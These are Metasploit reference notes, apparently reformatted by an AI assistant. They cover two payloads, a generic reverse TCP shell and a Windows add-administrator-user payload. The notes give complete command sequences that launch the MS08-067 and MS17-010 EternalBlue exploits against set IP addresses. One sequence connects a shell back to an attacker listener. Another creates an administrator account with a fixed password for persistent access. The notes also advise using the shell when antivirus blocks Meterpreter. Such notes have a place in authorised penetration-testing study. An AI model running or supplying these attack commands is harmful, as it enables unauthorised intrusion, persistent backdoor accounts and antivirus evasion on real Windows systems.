### METASPLOIT PAYLOADS: GENERIC/SHELL_REVERSE_TCP & WINDOWS/ADDUSER

### 1. Payload: generic/shell_reverse_tcp

**Description**

`generic/shell_reverse_tcp` is a simple reverse TCP shell payload.

- It attempts to send a basic command shell back to the attacker's machine after exploitation.
- Works on many OS types (Windows/Linux) – not OS-specific.
- Does not provide Meterpreter.
- Requires the target to connect back to your machine.
- You must set `LHOST` and `LPORT` properly.

### Usage with MS08-067 (NetAPI Exploit)

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.64
set LHOST 192.168.1.7
set LPORT 443          # Optional: Set port (default is 4444)
set PAYLOAD generic/shell_reverse_tcp
show options           # Check all required fields
exploit                # Run the exploit

```

### Usage with MS17-010 EternalBlue (Windows 7 Exploit)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD generic/shell_reverse_tcp
set RHOSTS 192.168.1.192
set LHOST 192.168.1.7
set LPORT 443          # Optional: Set port (default is 4444)
show options           # Check all required fields
exploit                # Run the exploit

```

**What You Get**

- A basic reverse shell.
- No Meterpreter functionality.
- Minimal stability.
- Depends fully on the target allowing outbound connections.
- If outbound connections are blocked, this payload will not work.

**When to Use**

Use `generic/shell_reverse_tcp` when:

- Meterpreter is getting blocked by antivirus.
- You want a very small, simple payload.
- You only need a quick basic shell.
- The target platform is unknown.

---

### 2. Payload: windows/adduser

**Description**

`windows/adduser` optionally adds the user to the Administrators group (default behavior).

- Does not give a shell or session.
- Used for persistent access.

### Usage with MS08-067 (NetAPI Exploit)

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.64
set PAYLOAD windows/adduser
show options            # Check options
set USER armour         # Set the username to create
set PASS Armour@123     # Set the password
show options            # Check required options
exploit                 # Run the exploit

```

**What Happens on the Target**

After successful exploitation, the following occurs:

- A new user `armour` is created.
- Password is set to `Armour@123`.
- The user is added to the Administrators group.
- No shell is returned.
- You can log in via RDP/SMB/WinRM if services are enabled.

---

Done! These notes are **100% complete, corrected (e.g., fixed typos like "generic/shell_reverse_tc" → "generic/shell_reverse_tcp"), and organized** – every detail, command, and example from the provided data is included. Use as your full Metasploit payloads reference.
